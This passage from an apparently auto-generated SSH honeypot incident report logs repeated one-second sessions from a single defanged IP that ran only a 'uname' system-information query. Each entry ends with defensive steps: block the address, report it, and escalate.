| `2026-07-12 14:48:54` | `cowrie.log.closed` |
| `2026-07-12 14:48:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01e62b107677

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:48 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:48:58` | `cowrie.session.connect` |
| `2026-07-12 14:48:58` | `cowrie.client.version` |
| `2026-07-12 14:48:58` | `cowrie.client.kex` |
| `2026-07-12 14:48:59` | `cowrie.login.success` |
| `2026-07-12 14:49:00` | `cowrie.session.params` |
| `2026-07-12 14:49:00` | `cowrie.command.input` |
| `2026-07-12 14:49:00` | `cowrie.log.closed` |
| `2026-07-12 14:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a975a03ae4b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:04` | `cowrie.session.connect` |
| `2026-07-12 14:49:04` | `cowrie.client.version` |
| `2026-07-12 14:49:04` | `cowrie.client.kex` |
| `2026-07-12 14:49:05` | `cowrie.login.success` |
| `2026-07-12 14:49:06` | `cowrie.session.params` |
| `2026-07-12 14:49:06` | `cowrie.command.input` |
| `2026-07-12 14:49:06` | `cowrie.log.closed` |
| `2026-07-12 14:49:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c0bf7b98742

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:10` | `cowrie.session.connect` |
| `2026-07-12 14:49:10` | `cowrie.client.version` |
| `2026-07-12 14:49:10` | `cowrie.client.kex` |
| `2026-07-12 14:49:10` | `cowrie.login.success` |
| `2026-07-12 14:49:11` | `cowrie.session.params` |
| `2026-07-12 14:49:11` | `cowrie.command.input` |
| `2026-07-12 14:49:11` | `cowrie.log.closed` |
| `2026-07-12 14:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b45fbfb4cb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:16` | `cowrie.session.connect` |
| `2026-07-12 14:49:16` | `cowrie.client.version` |
| `2026-07-12 14:49:16` | `cowrie.client.kex` |
| `2026-07-12 14:49:16` | `cowrie.login.success` |
| `2026-07-12 14:49:17` | `cowrie.session.params` |
| `2026-07-12 14:49:17` | `cowrie.command.input` |
| `2026-07-12 14:49:17` | `cowrie.log.closed` |
| `2026-07-12 14:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-846024abd474

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:21` | `cowrie.session.connect` |
| `2026-07-12 14:49:21` | `cowrie.client.version` |
| `2026-07-12 14:49:21` | `cowrie.client.kex` |
| `2026-07-12 14:49:22` | `cowrie.login.success` |
| `2026-07-12 14:49:23` | `cowrie.session.params` |
| `2026-07-12 14:49:23` | `cowrie.command.input` |
| `2026-07-12 14:49:23` | `cowrie.log.closed` |
| `2026-07-12 14:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5133114bac1a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:27` | `cowrie.session.connect` |
| `2026-07-12 14:49:27` | `cowrie.client.version` |
| `2026-07-12 14:49:27` | `cowrie.client.kex` |
| `2026-07-12 14:49:27` | `cowrie.login.success` |
| `2026-07-12 14:49:28` | `cowrie.session.params` |
| `2026-07-12 14:49:28` | `cowrie.command.input` |
| `2026-07-12 14:49:28` | `cowrie.log.closed` |
| `2026-07-12 14:49:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-013181b53c70

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:32` | `cowrie.session.connect` |
| `2026-07-12 14:49:32` | `cowrie.client.version` |
| `2026-07-12 14:49:32` | `cowrie.client.kex` |
| `2026-07-12 14:49:33` | `cowrie.login.success` |
| `2026-07-12 14:49:34` | `cowrie.session.params` |
| `2026-07-12 14:49:34` | `cowrie.command.input` |
| `2026-07-12 14:49:34` | `cowrie.log.closed` |
| `2026-07-12 14:49:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f9b3567064d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:37` | `cowrie.session.connect` |
| `2026-07-12 14:49:38` | `cowrie.client.version` |
| `2026-07-12 14:49:38` | `cowrie.client.kex` |
| `2026-07-12 14:49:38` | `cowrie.login.success` |
| `2026-07-12 14:49:39` | `cowrie.session.params` |
| `2026-07-12 14:49:39` | `cowrie.command.input` |
| `2026-07-12 14:49:39` | `cowrie.log.closed` |
| `2026-07-12 14:49:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6cd80f65683

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:44` | `cowrie.session.connect` |
| `2026-07-12 14:49:44` | `cowrie.client.version` |
| `2026-07-12 14:49:44` | `cowrie.client.kex` |
| `2026-07-12 14:49:44` | `cowrie.login.success` |
| `2026-07-12 14:49:45` | `cowrie.session.params` |
| `2026-07-12 14:49:45` | `cowrie.command.input` |
| `2026-07-12 14:49:45` | `cowrie.log.closed` |
| `2026-07-12 14:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed5b09e2c814

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:49` | `cowrie.session.connect` |
| `2026-07-12 14:49:49` | `cowrie.client.version` |
| `2026-07-12 14:49:49` | `cowrie.client.kex` |
| `2026-07-12 14:49:50` | `cowrie.login.success` |
| `2026-07-12 14:49:51` | `cowrie.session.params` |
| `2026-07-12 14:49:51` | `cowrie.command.input` |
| `2026-07-12 14:49:51` | `cowrie.log.closed` |
| `2026-07-12 14:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81f14cab3a40

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:49 |
| **Last Seen** | 2026-07-12 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:49:55` | `cowrie.session.connect` |
| `2026-07-12 14:49:55` | `cowrie.client.version` |
| `2026-07-12 14:49:55` | `cowrie.client.kex` |
| `2026-07-12 14:49:55` | `cowrie.login.success` |
| `2026-07-12 14:49:56` | `cowrie.session.params` |
| `2026-07-12 14:49:56` | `cowrie.command.input` |
| `2026-07-12 14:49:56` | `cowrie.log.closed` |
| `2026-07-12 14:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d60b3f1f96c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:00` | `cowrie.session.connect` |
| `2026-07-12 14:50:00` | `cowrie.client.version` |
| `2026-07-12 14:50:00` | `cowrie.client.kex` |
| `2026-07-12 14:50:00` | `cowrie.login.success` |
| `2026-07-12 14:50:01` | `cowrie.session.params` |
| `2026-07-12 14:50:01` | `cowrie.command.input` |
| `2026-07-12 14:50:01` | `cowrie.log.closed` |
| `2026-07-12 14:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b857c06fe48

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:06` | `cowrie.session.connect` |
| `2026-07-12 14:50:06` | `cowrie.client.version` |
| `2026-07-12 14:50:06` | `cowrie.client.kex` |
| `2026-07-12 14:50:06` | `cowrie.login.success` |
| `2026-07-12 14:50:07` | `cowrie.session.params` |
| `2026-07-12 14:50:07` | `cowrie.command.input` |
| `2026-07-12 14:50:07` | `cowrie.log.closed` |
| `2026-07-12 14:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-382176b0a13f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:12` | `cowrie.session.connect` |
| `2026-07-12 14:50:12` | `cowrie.client.version` |
| `2026-07-12 14:50:12` | `cowrie.client.kex` |
| `2026-07-12 14:50:13` | `cowrie.login.success` |
| `2026-07-12 14:50:13` | `cowrie.session.params` |
| `2026-07-12 14:50:13` | `cowrie.command.input` |
| `2026-07-12 14:50:13` | `cowrie.log.closed` |
| `2026-07-12 14:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4166fb18aa8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:18` | `cowrie.session.connect` |
| `2026-07-12 14:50:18` | `cowrie.client.version` |
| `2026-07-12 14:50:18` | `cowrie.client.kex` |
| `2026-07-12 14:50:18` | `cowrie.login.success` |
| `2026-07-12 14:50:19` | `cowrie.session.params` |
| `2026-07-12 14:50:19` | `cowrie.command.input` |
| `2026-07-12 14:50:20` | `cowrie.log.closed` |
| `2026-07-12 14:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e540252b76f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:23` | `cowrie.session.connect` |
| `2026-07-12 14:50:23` | `cowrie.client.version` |
| `2026-07-12 14:50:23` | `cowrie.client.kex` |
| `2026-07-12 14:50:23` | `cowrie.login.success` |
| `2026-07-12 14:50:25` | `cowrie.session.params` |
| `2026-07-12 14:50:25` | `cowrie.command.input` |
| `2026-07-12 14:50:25` | `cowrie.log.closed` |
| `2026-07-12 14:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb97c72af61c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:28` | `cowrie.session.connect` |
| `2026-07-12 14:50:28` | `cowrie.client.version` |
| `2026-07-12 14:50:28` | `cowrie.client.kex` |
| `2026-07-12 14:50:28` | `cowrie.login.success` |
| `2026-07-12 14:50:29` | `cowrie.session.params` |
| `2026-07-12 14:50:29` | `cowrie.command.input` |
| `2026-07-12 14:50:29` | `cowrie.log.closed` |
| `2026-07-12 14:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ff508e4b3ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:34` | `cowrie.session.connect` |
| `2026-07-12 14:50:34` | `cowrie.client.version` |
| `2026-07-12 14:50:34` | `cowrie.client.kex` |
| `2026-07-12 14:50:34` | `cowrie.login.success` |
| `2026-07-12 14:50:35` | `cowrie.session.params` |
| `2026-07-12 14:50:35` | `cowrie.command.input` |
| `2026-07-12 14:50:35` | `cowrie.log.closed` |
| `2026-07-12 14:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f41ee18abea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:39` | `cowrie.session.connect` |
| `2026-07-12 14:50:39` | `cowrie.client.version` |
| `2026-07-12 14:50:39` | `cowrie.client.kex` |
| `2026-07-12 14:50:40` | `cowrie.login.success` |
| `2026-07-12 14:50:40` | `cowrie.session.params` |
| `2026-07-12 14:50:40` | `cowrie.command.input` |
| `2026-07-12 14:50:40` | `cowrie.log.closed` |
| `2026-07-12 14:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcdaf1f47ba4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:44` | `cowrie.session.connect` |
| `2026-07-12 14:50:45` | `cowrie.client.version` |
| `2026-07-12 14:50:45` | `cowrie.client.kex` |
| `2026-07-12 14:50:45` | `cowrie.login.success` |
| `2026-07-12 14:50:46` | `cowrie.session.params` |
| `2026-07-12 14:50:46` | `cowrie.command.input` |
| `2026-07-12 14:50:47` | `cowrie.log.closed` |
| `2026-07-12 14:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f300c92d5a2f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:50` | `cowrie.session.connect` |
| `2026-07-12 14:50:50` | `cowrie.client.version` |
| `2026-07-12 14:50:50` | `cowrie.client.kex` |
| `2026-07-12 14:50:50` | `cowrie.login.success` |
| `2026-07-12 14:50:51` | `cowrie.session.params` |
| `2026-07-12 14:50:51` | `cowrie.command.input` |
| `2026-07-12 14:50:51` | `cowrie.log.closed` |
| `2026-07-12 14:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-746f59941ae5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:50 |
| **Last Seen** | 2026-07-12 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:50:56` | `cowrie.session.connect` |
| `2026-07-12 14:50:56` | `cowrie.client.version` |
| `2026-07-12 14:50:56` | `cowrie.client.kex` |
| `2026-07-12 14:50:56` | `cowrie.login.success` |
| `2026-07-12 14:50:57` | `cowrie.session.params` |
| `2026-07-12 14:50:57` | `cowrie.command.input` |
| `2026-07-12 14:50:57` | `cowrie.log.closed` |
| `2026-07-12 14:50:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e4d4c2408f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:01` | `cowrie.session.connect` |
| `2026-07-12 14:51:01` | `cowrie.client.version` |
| `2026-07-12 14:51:01` | `cowrie.client.kex` |
| `2026-07-12 14:51:01` | `cowrie.login.success` |
| `2026-07-12 14:51:02` | `cowrie.session.params` |
| `2026-07-12 14:51:02` | `cowrie.command.input` |
| `2026-07-12 14:51:03` | `cowrie.log.closed` |
| `2026-07-12 14:51:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33aae0dfc725

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:07` | `cowrie.session.connect` |
| `2026-07-12 14:51:07` | `cowrie.client.version` |
| `2026-07-12 14:51:07` | `cowrie.client.kex` |
| `2026-07-12 14:51:07` | `cowrie.login.success` |
| `2026-07-12 14:51:08` | `cowrie.session.params` |
| `2026-07-12 14:51:08` | `cowrie.command.input` |
| `2026-07-12 14:51:08` | `cowrie.log.closed` |
| `2026-07-12 14:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9c6d7d2e64b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:12` | `cowrie.session.connect` |
| `2026-07-12 14:51:12` | `cowrie.client.version` |
| `2026-07-12 14:51:12` | `cowrie.client.kex` |
| `2026-07-12 14:51:13` | `cowrie.login.success` |
| `2026-07-12 14:51:13` | `cowrie.session.params` |
| `2026-07-12 14:51:13` | `cowrie.command.input` |
| `2026-07-12 14:51:14` | `cowrie.log.closed` |
| `2026-07-12 14:51:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef245086090b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

